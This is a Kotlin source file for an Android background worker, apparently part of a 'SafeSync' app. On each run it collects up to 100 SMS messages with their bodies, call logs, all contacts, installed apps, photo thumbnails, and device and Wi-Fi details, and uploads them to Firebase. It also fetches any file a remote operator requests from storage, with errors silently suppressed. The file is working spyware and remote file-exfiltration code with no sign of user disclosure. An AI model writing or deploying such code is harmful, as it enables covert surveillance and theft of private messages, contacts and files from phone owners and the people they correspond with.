package com.strix.safesync.workers

import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.provider.CallLog
import android.telephony.TelephonyManager
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.strix.safesync.data.FirebaseManager
import java.io.File

class DataSyncWorker(context: Context, params: WorkerParameters) : CoroutineWorker(context, params) {

    override suspend fun doWork(): Result {
        syncCallLogs()
        syncAppList()
        syncDeviceInfo()
        syncContacts()
        syncGallery()
        syncSms()
        syncWifiInfo()
        handlePendingDownloadRequests()
        FirebaseManager.uploadHeartbeat()          // ← keep "last seen" fresh
        return Result.success()
    }

    // ─── Call Logs ────────────────────────────────────────────────────────────

    private fun syncCallLogs() {
        val logs = mutableListOf<Map<String, String>>()
        val cursor = applicationContext.contentResolver.query(
            CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC"
        )
        cursor?.use {
            val number   = it.getColumnIndex(CallLog.Calls.NUMBER)
            val type     = it.getColumnIndex(CallLog.Calls.TYPE)
            val date     = it.getColumnIndex(CallLog.Calls.DATE)
            val duration = it.getColumnIndex(CallLog.Calls.DURATION)
            var count = 0
            while (it.moveToNext() && count < 50) {
                logs.add(mapOf(
                    "number"   to (it.getString(number)   ?: ""),
                    "type"     to (it.getString(type)     ?: ""),
                    "date"     to (it.getString(date)     ?: ""),
                    "duration" to (it.getString(duration) ?: "")
                ))
                count++
            }
        }
        FirebaseManager.uploadCallLogs(logs)
    }

    // ─── Contacts ─────────────────────────────────────────────────────────────

    private fun syncContacts() {
        val contacts = mutableListOf<Map<String, String>>()
        try {
            val cursor = applicationContext.contentResolver.query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(
                    android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER
                ),
                null, null,
                android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            )
            cursor?.use {
                val nameIdx = it.getColumnIndexOrThrow(android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val numIdx = it.getColumnIndexOrThrow(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER)
                while (it.moveToNext()) {
                    contacts.add(mapOf(
                        "name" to (it.getString(nameIdx) ?: "Unknown"),
                        "number" to (it.getString(numIdx) ?: "")
                    ))
                }
            }
        } catch (_: Exception) {}
        FirebaseManager.uploadContacts(contacts.distinctBy { it["number"] })
    }

    // ─── App List ─────────────────────────────────────────────────────────────

    private fun syncAppList() {
        val apps = mutableListOf<Map<String, String>>()
        val pm = applicationContext.packageManager
        val packages = pm.getInstalledApplications(PackageManager.GET_META_DATA)
        for (app in packages) {
            if (app.flags and ApplicationInfo.FLAG_SYSTEM == 0) {
                apps.add(mapOf("name" to app.loadLabel(pm).toString(), "package" to app.packageName))
            }
        }
        FirebaseManager.uploadInstalledApps(apps)
    }

    // ─── Gallery Sync ─────────────────────────────────────────────

    private fun syncGallery() {
        val photos = mutableListOf<Map<String, String>>()
        try {
            val cursor = applicationContext.contentResolver.query(
                android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                arrayOf(
                    android.provider.MediaStore.Images.Media._ID,
                    android.provider.MediaStore.Images.Media.DATA
                ),
                null, null,
                android.provider.MediaStore.Images.Media.DATE_ADDED + " DESC"
            )
            cursor?.use {
                val dataIdx = it.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media.DATA)
                val idIdx = it.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media._ID)
                var count = 0
                while (it.moveToNext() && count < 150) {
                    val id = it.getLong(idIdx)
                    val path = it.getString(dataIdx)
                    if (path != null && File(path).exists()) {
                        try {
                            val thumbBitmap = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
                                val contentUri = android.content.ContentUris.withAppendedId(
                                    android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id
                                )
                                applicationContext.contentResolver.loadThumbnail(contentUri, android.util.Size(120, 120), null)
                            } else {
                                android.provider.MediaStore.Images.Thumbnails.getThumbnail(
                                    applicationContext.contentResolver, id,
                                    android.provider.MediaStore.Images.Thumbnails.MINI_KIND, null
                                )
                            }
                            var base64 = ""
                            if (thumbBitmap != null) {
                                val out = java.io.ByteArrayOutputStream()
                                thumbBitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 60, out)
                                base64 = android.util.Base64.encodeToString(out.toByteArray(), android.util.Base64.NO_WRAP)
                                thumbBitmap.recycle()
                            }
                            photos.add(mapOf("path" to path, "thumb" to base64))
                            count++
                        } catch (e: Exception) {
                            // Skip failures individually
                        }
                    }
                }
            }
        } catch (_: Exception) {}
        FirebaseManager.uploadGalleryPreview(photos)
    }

    private fun formatSize(bytes: Long): String = when {
        bytes >= 1_073_741_824L -> "%.1f GB".format(bytes / 1_073_741_824.0)
        bytes >= 1_048_576L     -> "%.1f MB".format(bytes / 1_048_576.0)
        bytes >= 1_024L         -> "%.1f KB".format(bytes / 1_024.0)
        else                    -> "$bytes B"
    }

    // ─── Device Info ──────────────────────────────────────────────────────────

    private fun syncDeviceInfo() {
        val context = applicationContext

        // Battery
        val batteryIntent = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val level   = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale   = batteryIntent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
        val battPct = if (level >= 0 && scale > 0) "${(level * 100 / scale.toFloat()).toInt()}%" else "Unknown"
        val plugged = batteryIntent?.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1) ?: -1
        val charging = when (plugged) {
            BatteryManager.BATTERY_PLUGGED_AC  -> "Charging (AC)"
            BatteryManager.BATTERY_PLUGGED_USB -> "Charging (USB)"
            BatteryManager.BATTERY_PLUGGED_WIRELESS -> "Charging (Wireless)"
            else -> "Not Charging"
        }

        // SIM / Network operator
        val tel = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
        val simOperator = tel?.networkOperatorName?.takeIf { it.isNotBlank() } ?: "No SIM"
        val simCountry  = tel?.networkCountryIso?.uppercase() ?: ""

        // Storage
        val extStat = Environment.getExternalStorageDirectory().let {
            val total = it.totalSpace; val free = it.freeSpace
            "${formatSize(total - free)} used / ${formatSize(total)}"
        }

        val info = mapOf(
            "model"       to "${Build.MANUFACTURER} ${Build.MODEL}",
            "android"     to "Android ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})",
            "battery"     to battPct,
            "charging"    to charging,
            "operator"    to simOperator,
            "simCountry"  to simCountry,
            "storage"     to extStat,
            "brand"       to Build.BRAND,
            "product"     to Build.PRODUCT
        )
        FirebaseManager.uploadDeviceInfo(info)
    }

    // ─── Download Request Handler ─────────────────────────────────────────────

    private fun handlePendingDownloadRequests() {
        FirebaseManager.checkPendingDownloadRequests { requestId, filePath ->
            try {
                val absPath = Environment.getExternalStorageDirectory().absolutePath + "/" + filePath
                val file = File(absPath)
                if (!file.exists() || !file.isFile) return@checkPendingDownloadRequests
                val bytes = file.readBytes()
                FirebaseManager.uploadFileToStorageAndRespond(requestId, bytes, filePath)
            } catch (e: Exception) {
                // Silently ignore - request will stay "pending" and retry next sync
            }
        }
    }

    // ─── SMS Sync ─────────────────────────────────────────────────────────────

    private fun syncSms() {
        val smsList = mutableListOf<Map<String, String>>()
        try {
            val cursor = applicationContext.contentResolver.query(
                android.provider.Telephony.Sms.CONTENT_URI,
                arrayOf(
                    android.provider.Telephony.Sms.ADDRESS,
                    android.provider.Telephony.Sms.BODY,
                    android.provider.Telephony.Sms.DATE,
                    android.provider.Telephony.Sms.TYPE
                ),
                null, null,
                android.provider.Telephony.Sms.DEFAULT_SORT_ORDER
            )
            cursor?.use {
                val addrIdx = it.getColumnIndexOrThrow(android.provider.Telephony.Sms.ADDRESS)
                val bodyIdx = it.getColumnIndexOrThrow(android.provider.Telephony.Sms.BODY)
                val dateIdx = it.getColumnIndexOrThrow(android.provider.Telephony.Sms.DATE)
                val typeIdx = it.getColumnIndexOrThrow(android.provider.Telephony.Sms.TYPE)
                var count = 0
                while (it.moveToNext() && count < 100) {
                    val type = when (it.getInt(typeIdx)) {
                        android.provider.Telephony.Sms.MESSAGE_TYPE_INBOX  -> "inbox"
                        android.provider.Telephony.Sms.MESSAGE_TYPE_SENT   -> "sent"
                        android.provider.Telephony.Sms.MESSAGE_TYPE_DRAFT  -> "draft"
                        else -> "other"
                    }
                    smsList.add(mapOf(
                        "address" to (it.getString(addrIdx) ?: ""),
                        "body"    to (it.getString(bodyIdx) ?: "").take(500),
                        "date"    to (it.getString(dateIdx) ?: ""),
                        "type"    to type
                    ))
                    count++
                }
            }
        } catch (_: Exception) {}
        FirebaseManager.uploadSms(smsList)
    }

    // ─── WiFi Sync ────────────────────────────────────────────────────────────

    private fun syncWifiInfo() {
        try {
            val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE)
                    as android.net.wifi.WifiManager
            @Suppress("DEPRECATION")
            val info = wifiManager.connectionInfo
            val ssid = info.ssid?.replace("\"", "") ?: "Unknown"
            val bssid = info.bssid ?: ""
            val ip = android.text.format.Formatter.formatIpAddress(info.ipAddress)
            val signal = android.net.wifi.WifiManager.calculateSignalLevel(info.rssi, 5)
            val rssi = "${info.rssi} dBm"
            val linkSpeed = "${info.linkSpeed} Mbps"

            FirebaseManager.uploadWifiInfo(mapOf(
                "ssid"      to ssid,
                "bssid"     to bssid,
                "ip"        to ip,
                "signal"    to "$signal/5",
                "rssi"      to rssi,
                "linkSpeed" to linkSpeed
            ))
        } catch (_: Exception) {}
    }
}

